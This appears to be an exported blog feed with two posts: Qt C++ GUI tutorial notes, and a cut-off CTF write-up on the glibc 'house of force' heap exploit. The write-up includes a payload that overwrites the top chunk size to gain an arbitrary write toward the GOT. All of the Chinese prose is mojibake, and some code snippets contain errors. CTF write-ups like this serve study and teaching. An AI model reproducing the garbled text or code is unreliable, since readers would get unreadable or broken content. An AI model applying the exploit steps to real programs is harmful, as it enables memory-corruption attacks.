<p>Qstringæ€ä¹ˆå»æ‰å¼•å·</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="3-ä¿¡å·å’Œæ§½çš„æ‹“å±•"><a href="#3-ä¿¡å·å’Œæ§½çš„æ‹“å±•" class="headerlink" title="3.ä¿¡å·å’Œæ§½çš„æ‹“å±•"></a>3.ä¿¡å·å’Œæ§½çš„æ‹“å±•</h3><ul>
<li>ä¿¡å·å¯ä»¥è¿æ¥ä¿¡å·</li>
<li>ä¸€ä¸ªä¿¡å·å¯ä»¥è¿æ¥å¤šä¸ªæ§½å‡½æ•°</li>
<li>å¤šä¸ªä¿¡å·å¯ä»¥è¿æ¥åŒä¸€ä¸ªæ§½å‡½æ•°</li>
<li><strong>ä¿¡å·å’Œæ§½å‡½æ•°çš„ç±»å‹å¿…é¡»ä¸€ä¸€å¯¹åº”</strong></li>
<li>ä¿¡å·çš„å‚æ•°ä¸ªæ•°å¯ä»¥å¤§äºæ§½å‡½æ•°çš„å‚æ•°ä¸ªæ•°</li>
</ul>
<h4 id="ä¿¡å·è¿æ¥ä¿¡å·"><a href="#ä¿¡å·è¿æ¥ä¿¡å·" class="headerlink" title="ä¿¡å·è¿æ¥ä¿¡å·"></a>ä¿¡å·è¿æ¥ä¿¡å·</h4><p>ç»§ç»­ä¸‹ä¸€ä¸ª</p>
<p><strong>æˆ‘ä»¬æŒ‰ä¸‹æŒ‰é’®1æ‰ä¼šå“é“ƒ</strong></p>
<p>è¿™é‡Œç”¨ä¸¤ç§å®ç°</p>
<ol>
<li>ç‚¹å‡»è¿æ¥plzå‡½æ•°</li>
<li><strong>ç‚¹å‡»è¿æ¥å“é“ƒä¿¡å·</strong>,æ­¤æ—¶å‡½æ•°ä¸­æ— å‚æ•°</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">		    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure>
<p>æ•ˆæœå›¾å¦‚ä¸‹</p>
<p>æ–¹æ³•1</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p>
<p>æ–¹æ³•2</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p>
<h3 id="4-Lambdaè¡¨è¾¾å¼"><a href="#4-Lambdaè¡¨è¾¾å¼" class="headerlink" title="4.Lambdaè¡¨è¾¾å¼"></a>4.Lambdaè¡¨è¾¾å¼</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">			btn1-&gt;setText(<span class="string">"ç¬¬äºŒä¸ª"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()è°ƒç”¨</span></span><br><span class="line"><span class="comment">//[]å¿…é¡»å­˜åœ¨ ä¸å¯çœç•¥</span></span><br><span class="line"><span class="comment">//()é‡è½½å‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="comment">//= å€¼ä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp; å¼•ç”¨ä¼ é€’</span></span><br><span class="line"><span class="comment">//a åªå¯¹aä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp;a åªå¯¹å¼•ç”¨aä¼ é€’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹äºæƒ³è¦å€¼ä¿®æ”¹ï¼Œéœ€è¦mutableå…³é”®å­—,ä½†ä¸æ”¹å˜æœ¬ä½“</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//è¿”å›å€¼ -&gt;è¿”å›å€¼ç±»å‹</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure>
<h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p>
<h3 id="1-èœå•æ "><a href="#1-èœå•æ " class="headerlink" title="1.èœå•æ "></a>1.èœå•æ </h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//èœå•æ </span></span><br><span class="line"><span class="comment">//èœå•æ æœ€å¤šæœ‰ä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•æ </span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//å°†èœå•æ æ”¾å…¥åˆ°çª—å£ä¸­</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"æ–‡ä»¶"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"ç¼–è¾‘"</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•é¡¹</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("æ–°å»º");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"æ–°å»º"</span>);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†éš”ç¬¦</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"æ‰“å¼€"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="2-å·¥å…·æ "><a href="#2-å·¥å…·æ " class="headerlink" title="2.å·¥å…·æ "></a>2.å·¥å…·æ </h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å·¥å…·æ </span></span><br><span class="line"><span class="comment">//å·¥å…·æ  å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//å·¥å…·æ åŒºåŸŸ</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//è®¾ç½®å·¥å…·æ åŒºåŸŸ åªå…è®¸å·¦å³åœé </span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//è®¾ç½®æµ®åŠ¨</span></span><br><span class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ç§»åŠ¨</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®å†…å®¹</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("æ–°å»º");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†å‰²çº¿</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//å·¥å…·æ æ·»åŠ æ§ä»¶</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"ç‚¹è¿™é‡Œ"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure>
<h3 id="3-çŠ¶æ€æ "><a href="#3-çŠ¶æ€æ " class="headerlink" title="3.çŠ¶æ€æ "></a>3.çŠ¶æ€æ </h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//çŠ¶æ€æ </span></span><br><span class="line"><span class="comment">//çŠ¶æ€æ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//è®¾ç½®åˆ°çª—å£</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//æ·»åŠ æ ‡ç­¾æ§ä»¶</span></span><br><span class="line"><span class="comment">//å·¦ä¾§æç¤º</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"å·¦ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//å³ä¾§æç¤º</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"å³ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure>
<h3 id="4-æµ®åŠ¨çª—å£"><a href="#4-æµ®åŠ¨çª—å£" class="headerlink" title="4.æµ®åŠ¨çª—å£"></a>4.æµ®åŠ¨çª—å£</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶(æµ®åŠ¨çª—å£)</span></span><br><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"æµ®åŠ¨"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//è®¾ç½®åœé åŒºåŸŸ</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure>
<h3 id="5-æ ¸å¿ƒéƒ¨ä»¶"><a href="#5-æ ¸å¿ƒéƒ¨ä»¶" class="headerlink" title="5.æ ¸å¿ƒéƒ¨ä»¶"></a>5.æ ¸å¿ƒéƒ¨ä»¶</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®ä¸­å¿ƒéƒ¨ä»¶(åªèƒ½æœ‰ä¸€ä¸ª)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure>
<h2 id="0x05-èµ„æºæ–‡ä»¶"><a href="#0x05-èµ„æºæ–‡ä»¶" class="headerlink" title="0x05 èµ„æºæ–‡ä»¶"></a>0x05 èµ„æºæ–‡ä»¶</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p>
<h2 id="0x06-å¯¹è¯æ¡†"><a href="#0x06-å¯¹è¯æ¡†" class="headerlink" title="0x06 å¯¹è¯æ¡†"></a>0x06 å¯¹è¯æ¡†</h2><h3 id="1-åŸºæœ¬æ¦‚å¿µ"><a href="#1-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="1.åŸºæœ¬æ¦‚å¿µ"></a>1.åŸºæœ¬æ¦‚å¿µ</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ–°å»ºæŒ‰é’® å¼¹å‡ºå¯¹è¯æ¡†</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew,&amp;QAction::triggered,[=]()&#123;</span><br><span class="line">        <span class="comment">//æ¨¡æ€å¯¹è¯æ¡† ï¼ˆä¸å¯ä»¥å¯¹å…¶å®ƒçª—å£è¿›è¡Œæ“ä½œï¼‰</span></span><br><span class="line">        <span class="comment">//éæ¨¡æ€å¯¹è¯æ¡† ï¼ˆå¯ä»¥å¯¹å…¶ä»–çª—å£è¿›è¡Œæ“ä½œï¼‰</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ¨¡æ€å¯¹è¯æ¡†çš„åˆ›å»º</span></span><br><span class="line">        QDialog dlg(<span class="keyword">this</span>);</span><br><span class="line">        <span class="comment">//å¯¹è¯æ¡†çš„å¤§å°</span></span><br><span class="line">        dlg.resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="comment">//å¯¹è¯æ¡†é˜»å¡</span></span><br><span class="line">        dlg.exec();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éæ¨¡æ€å¯¹è¯æ¡†</span></span><br><span class="line">        QDialog *dlg2 = <span class="keyword">new</span> QDialog(<span class="keyword">this</span>);</span><br><span class="line">        dlg2-&gt;resize(<span class="number">200</span>,<span class="number">100</span>);</span><br><span class="line">        dlg2-&gt;show();</span><br><span class="line">        <span class="comment">//å…³é—­é‡Šæ”¾å†…å­˜</span></span><br><span class="line">        dlg2-&gt;setAttribute(Qt::WA_DeleteOnClose);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="2-æ ‡å‡†å¯¹è¯æ¡†"><a href="#2-æ ‡å‡†å¯¹è¯æ¡†" class="headerlink" title="2.æ ‡å‡†å¯¹è¯æ¡†"></a>2.æ ‡å‡†å¯¹è¯æ¡†</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ¶ˆæ¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//é”™è¯¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QMessageBox::critical(this,"é”™è¯¯","é”™è¯¯");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿¡æ¯å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QMessageBox::information(this,"æ¶ˆæ¯","æ¶ˆæ¯");</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æé—®å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 æç¤ºå†…å®¹ å‚æ•°4 æŒ‰é”®ç±»å‹</span></span><br><span class="line">QMessageBox::question(<span class="keyword">this</span>,<span class="string">"æé—®"</span>,<span class="string">"æé—®"</span>,QMessageBox::Save|QMessageBox::Cancel);</span><br><span class="line"><span class="keyword">if</span>(QMessageBox::Save==QMessageBox::question(<span class="keyword">this</span>,<span class="string">"æé—®"</span>,<span class="string">"æé—®"</span>,QMessageBox::Save|QMessageBox::Cancel))&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"ä¿å­˜"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-å…¶ä»–å¯¹è¯æ¡†"><a href="#3-å…¶ä»–å¯¹è¯æ¡†" class="headerlink" title="3.å…¶ä»–å¯¹è¯æ¡†"></a>3.å…¶ä»–å¯¹è¯æ¡†</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//é¢œè‰²å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//QColor color = QColorDialog::getColor(QColor(255,0,0));</span></span><br><span class="line"><span class="comment">//æ–‡ä»¶å¯¹è¯æ¡†</span></span><br><span class="line"><span class="comment">//å‚æ•°1 çˆ¶äº² å‚æ•°2 æ ‡é¢˜ å‚æ•°3 ç›®å½• å‚æ•°4 æ–‡ä»¶æ ¼å¼</span></span><br><span class="line"><span class="comment">//QString str = QFileDialog::getOpenFileName(this,"æ‰“å¼€","c://","(*.txt)");</span></span><br><span class="line"><span class="comment">//å­—ä½“å¯¹è¯æ¡†</span></span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">QFontDialog::getFont(&amp;flag,QFont(<span class="string">"åæ–‡å½©äº‘"</span>,<span class="number">36</span>));</span><br></pre></td></tr></table></figure>
<h2 id="0x07-ç•Œé¢å¸ƒå±€"><a href="#0x07-ç•Œé¢å¸ƒå±€" class="headerlink" title="0x07 ç•Œé¢å¸ƒå±€"></a>0x07 ç•Œé¢å¸ƒå±€</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210092318304.png" alt="image-20201210092318304"></p>
<h2 id="0x08-æ§ä»¶"><a href="#0x08-æ§ä»¶" class="headerlink" title="0x08 æ§ä»¶"></a>0x08 æ§ä»¶</h2><h3 id="1-æŒ‰é’®"><a href="#1-æŒ‰é’®" class="headerlink" title="1.æŒ‰é’®"></a>1.æŒ‰é’®</h3><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210100503686.png" alt="image-20201210100503686"></p>
<h3 id="2-æ ‘æ§ä»¶"><a href="#2-æ ‘æ§ä»¶" class="headerlink" title="2.æ ‘æ§ä»¶"></a>2.æ ‘æ§ä»¶</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ ‘æ§ä»¶çš„ä½¿ç”¨</span></span><br><span class="line"><span class="comment">//æ°´å¹³å¤´</span></span><br><span class="line">ui-&gt;treeWidget-&gt;setHeaderLabels(QStringList()&lt;&lt; <span class="string">"è‹±é›„"</span> &lt;&lt; <span class="string">"è‹±é›„ä»‹ç»"</span>);</span><br><span class="line"><span class="comment">//åŠ è½½é¡¶å±‚çš„èŠ‚ç‚¹</span></span><br><span class="line">QTreeWidgetItem * liitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"åŠ›é‡"</span>);</span><br><span class="line">QTreeWidgetItem * spitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"é€Ÿåº¦"</span>);</span><br><span class="line">QTreeWidgetItem * faitem =  <span class="keyword">new</span> QTreeWidgetItem(QStringList()&lt;&lt;<span class="string">"æ³•åŠ›"</span>);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(liitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(spitem);</span><br><span class="line">ui-&gt;treeWidget-&gt;addTopLevelItem(faitem);</span><br></pre></td></tr></table></figure>
<h3 id="3-tableæ§ä»¶"><a href="#3-tableæ§ä»¶" class="headerlink" title="3.tableæ§ä»¶"></a>3.tableæ§ä»¶</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//tableæ§ä»¶</span></span><br><span class="line">    <span class="comment">//è®¾ç½®åˆ—æ•°</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setColumnCount(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ°´å¹³è¡¨å¤´</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setHorizontalHeaderLabels(QStringList()&lt;&lt;<span class="string">"å§“å"</span> &lt;&lt;<span class="string">"æ€§åˆ«"</span> &lt;&lt; <span class="string">"å¹´é¾„"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®è¡Œæ•°</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setRowCount(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ­£æ–‡</span></span><br><span class="line">    ui-&gt;tableWidget-&gt;setItem(<span class="number">0</span>,<span class="number">0</span>,<span class="keyword">new</span> QTableWidgetItem(<span class="string">"å‹ç¼©"</span>));</span><br><span class="line">    <span class="comment">//åˆ—è¡¨</span></span><br><span class="line">    QList&lt;QString&gt; namelist;</span><br><span class="line">    QStringList sexlist;</span><br><span class="line">    sexlist &lt;&lt; <span class="string">"ç”·"</span> &lt;&lt; <span class="string">"ç”·"</span> &lt;&lt; <span class="string">"ç”·"</span>  &lt;&lt; <span class="string">"ç”·"</span>ï¼›</span><br><span class="line">    namelist &lt;&lt; <span class="string">"ll"</span> &lt;&lt; <span class="string">"aa"</span> &lt;&lt; <span class="string">"11"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="4-å…¶ä»–æ§ä»¶"><a href="#4-å…¶ä»–æ§ä»¶" class="headerlink" title="4.å…¶ä»–æ§ä»¶"></a>4.å…¶ä»–æ§ä»¶</h3><p>éœ€è¦çš„æ—¶å»çœ‹åº“å§</p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201210104641479.png" alt="image-20201210104641479"></p>
<h2 id="0x09-Qfileæ–‡ä»¶è¯»å†™"><a href="#0x09-Qfileæ–‡ä»¶è¯»å†™" class="headerlink" title="0x09 Qfileæ–‡ä»¶è¯»å†™"></a>0x09 Qfileæ–‡ä»¶è¯»å†™</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083900742.png" alt="image-20201214083900742"></p>
<p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201214083912652.png" alt="image-20201214083912652"></p>
]]></content>
      <categories>
        <category>Qt</category>
      </categories>
      <tags>
        <tag>Qt</tag>
        <tag>å®éªŒ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ–°ç”Ÿèµ›å¤ç°</title>
    <url>/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬</p>
<p>å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯†</p>
<hr>
<p>æ·¦ æˆ‘æ˜¯fw æ‹–äº†äº”å¤© ç»ˆäºæ¥å¤ç°äº†</p>
<p>ä½†å‘ç°å †å·²ç»å¿˜å¾—å·®ä¸å¤šäº†</p>
<p>å…ˆå¤ä¹ å †çš„åŸºç¡€çŸ¥è¯†</p>
<p><a href="https://blog.csdn.net/qq_41453285/category_9150569.htmlï¼ˆæµ…æ˜¾æ˜“æ‡‚ï¼Œéå¸¸é€‚åˆæ–°æ‰‹å­¦ï¼‰" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/category_9150569.htmlï¼ˆæµ…æ˜¾æ˜“æ‡‚ï¼Œéå¸¸é€‚åˆæ–°æ‰‹å­¦ï¼‰</a></p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_overview-zh/</a></p>
<h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>å®˜æ–¹wp</p>
<blockquote>
<p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p>
<p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p>
</blockquote>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹house of force</p>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a><strong>house of force</strong></h2><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p>
<ul>
<li>èƒ½å¤Ÿä»¥æº¢å‡ºç­‰æ–¹å¼æ§åˆ¶åˆ° top chunk çš„ size åŸŸ</li>
<li>èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°</li>
</ul>
<p><strong>åˆ©ç”¨æ­¥éª¤</strong></p>
<p>(1)é¦–å…ˆå…ˆæ³„éœ²å‡ºå †åœ°å€ã€‚</p>
<p>(2)åˆ©ç”¨å †æº¢å‡ºï¼Œå°†top chunkçš„sizeåŸŸä¿®æ”¹ä¸ºå¾ˆå¤§çš„æ•°</p>
<p>(3)ç”³è¯·å¤§å—å†…å­˜(å¯ä»¥é€šè¿‡å †åœ°å€å’Œç›®æ ‡åœ°å€çš„è·ç¦»è¿›è¡Œè®¡ç®—)ï¼Œä½¿å¾—top chunkçš„å¤´éƒ¨è½åœ¨ç›®æ ‡åœ°å€èŒƒå›´å†…ã€‚</p>
<p>(4)å†æ¬¡ç”³è¯·å†…å­˜ï¼Œé‚£ä¹ˆæ–°ç”³è¯·çš„å†…å­˜å³ä¸ºç›®æ ‡åœ°å€ï¼Œé€šå¸¸æƒ…å†µä¸‹(æœªå¼€å¯FullRelro)ï¼Œä¸€èˆ¬æ˜¯å°†ç›®æ ‡åœ°å€è®¾ä¸ºgotè¡¨åœ°å€ã€‚</p>
<p>House Of Force äº§ç”Ÿçš„åŸå› åœ¨äº glibc å¯¹ top chunk çš„å¤„ç†ï¼Œæ ¹æ®å‰é¢å †æ•°æ®ç»“æ„éƒ¨åˆ†çš„çŸ¥è¯†æˆ‘ä»¬å¾—çŸ¥ï¼Œè¿›è¡Œå †åˆ†é…æ—¶ï¼Œå¦‚æœæ‰€æœ‰ç©ºé—²çš„å—éƒ½æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£ä¹ˆå°±ä¼šä» top chunk ä¸­åˆ†å‰²å‡ºç›¸åº”çš„å¤§å°ä½œä¸ºå †å—çš„ç©ºé—´ã€‚</p>
<p>é‚£ä¹ˆï¼Œå½“ä½¿ç”¨ top chunk åˆ†é…å †å—çš„ size å€¼æ˜¯ç”±ç”¨æˆ·æ§åˆ¶çš„ä»»æ„å€¼æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿç­”æ¡ˆæ˜¯ï¼Œå¯ä»¥ä½¿å¾— top chunk æŒ‡å‘æˆ‘ä»¬æœŸæœ›çš„ä»»ä½•ä½ç½®ï¼Œè¿™å°±ç›¸å½“äºä¸€æ¬¡ä»»æ„åœ°å€å†™ã€‚</p>
<p>å› ä¸ºæ˜¯ç¬¬ä¸€æ¬¡å¼„å †é¢˜ æ‰€ä»¥å°½é‡å¼„å¾—æ¸…æ¥šä¸€ç‚¹</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122054112.png" alt="image-20201213122054112"></p>
<p>è¿˜æœªè¿›å…¥èœå• å †ä¸­æƒ…å†µ</p>
<p>ä¸¤ä¸ªæŒ‡é’ˆ</p>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213122653935.png" alt="image-20201213122653935"></p>
<p>æ·»åŠ ä¸€ä¸ª</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">"aaaa"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213140931866.png" alt="image-20201213140931866"></p>
<p>ä¿®æ”¹top chunkå¤§å°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br></pre></td></tr></table></figure>
<p><img src="/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20201213170620443.png" alt="image-20201213170620443"></p>
<p>è¿™æ—¶ æˆ‘ä»¬éœ€è¦æŠŠtopæŒ‡é’ˆæŒ‡å‘å †åº•ï¼Œä»è€Œæ”¹å˜å‡½æ•°æŒ‡é’ˆ</p>
